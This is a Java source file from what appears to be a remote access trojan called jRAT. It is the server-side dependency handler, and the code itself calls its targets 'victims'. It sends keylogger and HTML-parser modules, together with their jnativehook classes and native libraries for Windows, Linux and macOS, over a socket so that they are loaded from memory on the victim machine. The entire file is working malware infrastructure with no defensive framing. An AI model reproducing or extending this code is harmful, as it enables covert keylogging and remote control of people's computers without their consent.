package jRAT.server;

import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.util.HashMap;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.Map;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;

public class JRATDependencyHandler {

    private static final int VICTIM_ARCHITECTURE_UNKNOWN   = -1;
    private static final int VICTIM_ARCHITECTURE_WIN_32    = 0;
    private static final int VICTIM_ARCHITECTURE_WIN_64    = 1;
    private static final int VICTIM_ARCHITECTURE_LINUX_32  = 2;
    private static final int VICTIM_ARCHITECTURE_LINUX_64  = 3;
    private static final int VICTIM_ARCHITECTURE_LINUX_ARM = 4;
    private static final int VICTIM_ARCHITECTURE_MAC_OS_32 = 5;
    private static final int VICTIM_ARCHITECTURE_MAC_OS_64 = 6;

    private static final int DEPENDENCY_TYPE_JAR           = 0;
    private static final int DEPENDENCY_TYPE_CLASS         = 1;
    private static final int DEPENDENCY_TYPE_SHARED_LIB    = 2;
    
    private static final String SHARED_LIB_KEY             = "SHARED_LIB";

    private static final String SHARED_LIB_KEY_WIN_32      = "WIN_32";
    private static final String SHARED_LIB_KEY_WIN_64      = "WIN_64";
    private static final String SHARED_LIB_KEY_LINUX_32    = "LINUX_32";
    private static final String SHARED_LIB_KEY_LINUX_64    = "LINUX_64";
    private static final String SHARED_LIB_KEY_LINUX_ARM   = "LINUX_ARM";
    private static final String SHARED_LIB_KEY_MAC_OS_32   = "MAC_OS_32";
    private static final String SHARED_LIB_KEY_MAC_OS_64   = "MAC_OS_64";

    /* Contains a list of necessary dependencies for a given module name */
    private static final Map<String, LinkedList<String>> moduleDependencies = new HashMap<String, LinkedList<String>>();

    /* Contains a list of classes and the order in which they should be loaded for a given dependency
     * (based on JAR name). In case an entry is not found for a given dependency in this map default
     * JAR loader for loading from-memory is used on the victim machine, which iterates over all the
     * classes in the JAR and tries to load them. The default loader will fail if there is any class
     * in the JAR that has an external dependency not found in the JAR, that was not loaded as a
     * previous dependency, or if the JAR needs to load shared libraries.
     */
    private static final Map<String, LinkedList<String>> dependencyLoadProcess = new HashMap<String, LinkedList<String>>();

    /* Contains paths to a shared lib inside a jar based on victim machine architecture */
    private static final Map<String, Map<String,String>> sharedLibJARPaths = new HashMap<String, Map<String,String>>();
    
    /* ----------------------------------------------------------------------------------------------------------------------- */

    public static void initDependencyHandlerSystem()
    {
        final LinkedList<String> dependenciesModuleHTMLParser = new LinkedList<String>();
        dependenciesModuleHTMLParser.add("jsoup-1.13.1.jar");

        final LinkedList<String> dependenciesModuleKeylogger = new LinkedList<String>();
        dependenciesModuleKeylogger.add("jnativehook-2.1.0.jar");
        dependenciesModuleKeylogger.add("jRAT.moduleAuxiliary.ModuleKeyloggerCustomLibraryLocator");

        final LinkedList<String> loadProcessJNativeHook = new LinkedList<String>();
        loadProcessJNativeHook.add("org.jnativehook.GlobalScreen");
        loadProcessJNativeHook.add("org.jnativehook.GlobalScreen$EventDispatchTask");
        loadProcessJNativeHook.add("org.jnativehook.GlobalScreen$NativeHookThread");
        loadProcessJNativeHook.add("org.jnativehook.NativeHookException");
        loadProcessJNativeHook.add("org.jnativehook.NativeInputEvent");
        loadProcessJNativeHook.add("org.jnativehook.keyboard.NativeKeyEvent");
        loadProcessJNativeHook.add("org.jnativehook.mouse.NativeMouseEvent");
        loadProcessJNativeHook.add("org.jnativehook.mouse.NativeMouseWheelEvent");
        loadProcessJNativeHook.add("org.jnativehook.keyboard.NativeKeyListener");
        loadProcessJNativeHook.add("org.jnativehook.mouse.NativeMouseListener");
        loadProcessJNativeHook.add("org.jnativehook.mouse.NativeMouseMotionListener");
        loadProcessJNativeHook.add("org.jnativehook.mouse.NativeMouseWheelListener");
        loadProcessJNativeHook.add("org.jnativehook.NativeMonitorInfo");
        loadProcessJNativeHook.add("org.jnativehook.dispatcher.DefaultDispatchService");
        loadProcessJNativeHook.add("org.jnativehook.dispatcher.DefaultDispatchService$1");
        loadProcessJNativeHook.add("org.jnativehook.NativeLibraryLocator");
        loadProcessJNativeHook.add("org.jnativehook.DefaultLibraryLocator");
        loadProcessJNativeHook.add("org.jnativehook.NativeSystem");
        loadProcessJNativeHook.add("org.jnativehook.NativeSystem$Arch");
        loadProcessJNativeHook.add("org.jnativehook.NativeSystem$Family");
        /* At the entry below lookup the correct record path in sharedLibJarPathsJNativeHook */
        loadProcessJNativeHook.add(SHARED_LIB_KEY);     
        dependencyLoadProcess.put("jnativehook-2.1.0.jar", loadProcessJNativeHook);     
        
        final Map<String, String> sharedLibJARPathsJNativeHook = new HashMap<String,String>();
        sharedLibJARPathsJNativeHook.put(SHARED_LIB_KEY_WIN_32, "org/jnativehook/lib/windows/x86/JNativeHook.dll");
        sharedLibJARPathsJNativeHook.put(SHARED_LIB_KEY_WIN_64, "org/jnativehook/lib/windows/x86_64/JNativeHook.dll");
        sharedLibJARPathsJNativeHook.put(SHARED_LIB_KEY_LINUX_32, "org/jnativehook/lib/linux/x86/libJNativeHook.so");
        sharedLibJARPathsJNativeHook.put(SHARED_LIB_KEY_LINUX_64, "org/jnativehook/lib/linux/x86_64/libJNativeHook.so");
        sharedLibJARPathsJNativeHook.put(SHARED_LIB_KEY_LINUX_ARM,"org/jnativehook/lib/linux/arm6/libJNativeHook.so");
        sharedLibJARPathsJNativeHook.put(SHARED_LIB_KEY_MAC_OS_32, "org/jnativehook/lib/darwin/x86/libJNativeHook.dylib");
        sharedLibJARPathsJNativeHook.put(SHARED_LIB_KEY_MAC_OS_64, "org/jnativehook/lib/darwin/x86_64/libJNativeHook.dylib");
        sharedLibJARPaths.put("jnativehook-2.1.0.jar", sharedLibJARPathsJNativeHook);

        moduleDependencies.put("jRAT.modules.ModuleHTMLParser", dependenciesModuleHTMLParser);
        moduleDependencies.put("jRAT.modules.ModuleKeylogger",  dependenciesModuleKeylogger);
    }
    
    /* ----------------------------------------------------------------------------------------------------------------------- */
    /* ----------------------------------------------------------------------------------------------------------------------- */
    /* ----------------------------------------------------------------------------------------------------------------------- */
    /* ----------------------------------------------------------------------------------------------------------------------- */

    public static boolean exchangeDependencies(DataInputStream input, DataOutputStream output, String moduleName) throws IOException
    {
        boolean STATUS = true;


        // Read architecture
        // -----------------
        int architecture = input.readInt();


        // Calculate & send the total number of dependencies
        // -------------------------------------------------
        LinkedList<String> dependencies = moduleDependencies.get(moduleName);
        if (dependencies == null || dependencies.size() == 0) { output.writeInt(0); /* total number of dependencies */ }
        else
        {
            int totalDependencyNum = 0;
            Iterator iterator = dependencies.iterator();
            while (iterator.hasNext())
            {
                String currentDependencyName = (String) iterator.next();
                if (currentDependencyName.toLowerCase().endsWith(".jar"))
                {
                    LinkedList<String> currentDependencyLoadProcess = dependencyLoadProcess.get(currentDependencyName);

                    /* Dependency is loaded using a default In-Memory JAR loader */
                    if (currentDependencyLoadProcess == null)
                    {
                        totalDependencyNum += 1;
                    }
                    /* Each class in a jar is loaded separately for this dependency.
                     * Shared library could also be an entry in this JAR, specified
                     * as "SHARED_LIB" entry.
                     */
                    else
                    {
                        totalDependencyNum += currentDependencyLoadProcess.size();
                    }
                }
                /* Dependency is a plain .class file located in jRAT.moduleAuxiliary package */
                else { totalDependencyNum += 1; }
            }       
            output.writeInt(totalDependencyNum);

            /* -------------------------------------------------------------------------------------------------- */

            // Send the dependencies
            // ---------------------
            String lastDependencyResponse = "OK";
            iterator = dependencies.iterator();
            OUTER: while (iterator.hasNext())
            {
                String currentDependencyName = (String) iterator.next();
                if (currentDependencyName.toLowerCase().endsWith(".jar"))
                {
                    LinkedList<String> currentDependencyLoadProcess = dependencyLoadProcess.get(currentDependencyName);

                    /* ------------------------------------------------------------------------------------------ */

                    // Dependency is loaded using a default In-Memory JAR loader
                    // ---------------------------------------------------------
                    if (currentDependencyLoadProcess == null)
                    {
                        byte[] dependencyBytes = JRATUtils.loadModuleBytes("/" + currentDependencyName);
                        System.out.println("Loading dependency: " + currentDependencyName);

                        if (dependencyBytes == null || dependencyBytes.length == 0)
                        {
                            System.out.println("=> Could not load dependency!");
                            STATUS = false;
                            break OUTER;
                        }
                        
                        output.writeInt(DEPENDENCY_TYPE_JAR);                   // Dependency type
                        output.writeUTF(currentDependencyName);                 // Dependency name
                        output.writeLong(dependencyBytes.length);               // Dependency length
                        output.write(dependencyBytes);                          // Dependency bytes

                        lastDependencyResponse = input.readUTF();
                        System.out.println("=> " + lastDependencyResponse);

                        if (!lastDependencyResponse.equals("OK"))
                        {
                            STATUS = false;
                            break OUTER;
                        }
                    }
                    
                    /* ------------------------------------------------------------------------------------------ */
                    
                    // Each class in a jar is loaded separately for this dependency
                    // ------------------------------------------------------------
                    else
                    {
                        /* Create a map for class bytes */
                        Map<String, byte[]> dependencyBytesMap = new HashMap<String, byte[]>();
                        
                        /* Retrieve a path for a shared library if this jar uses it */
                        boolean sharedLibFound = false;
                        String sharedLibPath = null;
                        String sharedLibName = null;
                        Map<String,String> currentSharedLibJARPaths = sharedLibJARPaths.get(currentDependencyName);

                        if (currentSharedLibJARPaths != null)
                        {
                            switch (architecture)
                            {
                                case VICTIM_ARCHITECTURE_WIN_32:    sharedLibPath = currentSharedLibJARPaths.get(SHARED_LIB_KEY_WIN_32);    break;
                                case VICTIM_ARCHITECTURE_WIN_64:    sharedLibPath = currentSharedLibJARPaths.get(SHARED_LIB_KEY_WIN_64);    break;
                                case VICTIM_ARCHITECTURE_LINUX_32:  sharedLibPath = currentSharedLibJARPaths.get(SHARED_LIB_KEY_LINUX_32);  break;
                                case VICTIM_ARCHITECTURE_LINUX_64:  sharedLibPath = currentSharedLibJARPaths.get(SHARED_LIB_KEY_LINUX_64);  break;
                                case VICTIM_ARCHITECTURE_LINUX_ARM: sharedLibPath = currentSharedLibJARPaths.get(SHARED_LIB_KEY_LINUX_ARM); break;
                                case VICTIM_ARCHITECTURE_MAC_OS_32: sharedLibPath = currentSharedLibJARPaths.get(SHARED_LIB_KEY_MAC_OS_32); break;
                                case VICTIM_ARCHITECTURE_MAC_OS_64: sharedLibPath = currentSharedLibJARPaths.get(SHARED_LIB_KEY_MAC_OS_64); break;
                                default:
                                    System.out.println("=> Could not load dependency: unsupported architecture!");
                                    STATUS = false;
                                    break OUTER;
                            }
                        }

                        /* Open JAR and read all the necessary resources from it */
                        byte[] jarBytes = JRATUtils.loadModuleBytes("/" + currentDependencyName);
                        JarInputStream jarInput = new JarInputStream(new ByteArrayInputStream(jarBytes));

                        while (true)
                        {
                            JarEntry currentEntry = jarInput.getNextJarEntry();
                            if (currentEntry == null)
                                break;

                            if (sharedLibPath != null && !sharedLibFound)
                            {
                                if (currentEntry.getName().equals(sharedLibPath))
                                {
                                    /* load bytes to temporary map */
                                    byte[] rawClassBytes    = JRATUtils.readClassBytes(jarInput, currentEntry);
                                    dependencyBytesMap.put(SHARED_LIB_KEY, rawClassBytes);
                                    String sharedLibNameRaw = currentEntry.getName();                                   
                                    int index               = sharedLibNameRaw.lastIndexOf("/");
                                    sharedLibName           = sharedLibNameRaw.substring(index, sharedLibNameRaw.length());                                 
                                    sharedLibFound          = true;
                                    continue;
                                }                               
                            }
                            
                            if (!currentEntry.getName().endsWith(".class"))
                                continue;
                            
                            String finalClassName = currentEntry.getName().replaceAll("/", ".").replaceAll(".class", "");
                            if (currentDependencyLoadProcess.contains(finalClassName))
                            {
                                /* load bytes to temporary map */
                                byte[] rawClassBytes = JRATUtils.readClassBytes(jarInput, currentEntry);
                                dependencyBytesMap.put(finalClassName, rawClassBytes);
                            }
                        }
                        jarInput.close();


                        /* Send dependencies one-by-one over the network */
                        Iterator loadProcessIterator = currentDependencyLoadProcess.iterator();
                        while (loadProcessIterator.hasNext())
                        {
                            String currentName = (String) loadProcessIterator.next();
                            byte[] dependencyBytes = dependencyBytesMap.get(currentName);
                            System.out.println("Loading dependency: " + currentName);                       

                            if (dependencyBytes == null || dependencyBytes.length == 0)
                            {
                                System.out.println("=> Could not load dependency!");
                                STATUS = false;
                                break OUTER;
                            }

                            if (currentName.equals(SHARED_LIB_KEY))
                            {
                                output.writeInt(DEPENDENCY_TYPE_SHARED_LIB);    // Dependency type
                                output.writeUTF(sharedLibName);                 // Dependency name
                            }
                            else
                            {
                                output.writeInt(DEPENDENCY_TYPE_CLASS);         // Dependency type
                                output.writeUTF(currentName);                   // Dependency name
                                
                            }
                            output.writeLong(dependencyBytes.length);           // Dependency length
                            output.write(dependencyBytes);                      // Dependency bytes

                            lastDependencyResponse = input.readUTF();
                            System.out.println("=> " + lastDependencyResponse);

                            if (!lastDependencyResponse.equals("OK"))
                            {
                                STATUS = false;
                                break OUTER;
                            }                           
                        }
                    }
                }

                /* ------------------------------------------------------------------------------------------ */

                // Dependency is a plain .class file
                // ---------------------------------
                else
                {
                    byte[] dependencyBytes = JRATUtils.loadModuleBytes("/" + currentDependencyName.replaceAll("\\.", "/") + ".class");
                    System.out.println("Loading dependency: " + currentDependencyName);

                    if (dependencyBytes == null || dependencyBytes.length == 0)
                    {
                        System.out.println("=> Could not load dependency!");
                        STATUS = false;
                        break OUTER;
                    }

                    output.writeInt(DEPENDENCY_TYPE_CLASS);                     // Dependency type
                    output.writeUTF(currentDependencyName);                     // Dependency name
                    output.writeLong(dependencyBytes.length);                   // Dependency length
                    output.write(dependencyBytes);                              // Dependency bytes

                    lastDependencyResponse = input.readUTF();
                    System.out.println("=> " + lastDependencyResponse);

                    if (!lastDependencyResponse.equals("OK"))
                    {
                        STATUS = false;
                        break OUTER;
                    }
                }

                /* ------------------------------------------------------------------------------------------ */
            }           
        }
        return STATUS;
    }
}
